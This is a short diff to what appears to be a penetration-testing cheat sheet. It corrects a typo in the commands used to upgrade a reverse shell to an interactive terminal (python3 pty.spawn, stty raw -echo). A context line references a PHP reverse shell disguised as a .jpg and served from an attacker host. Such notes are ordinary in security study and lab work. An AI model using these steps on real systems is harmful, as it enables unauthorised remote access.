@@ -73,7 +73,7 @@ http://$KALI:81/php-reverse-shell.php#.jpg
 Get autocomplete
 
 ```
-pytho3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ctrl + Z
 stty raw -echo;fg
 ```
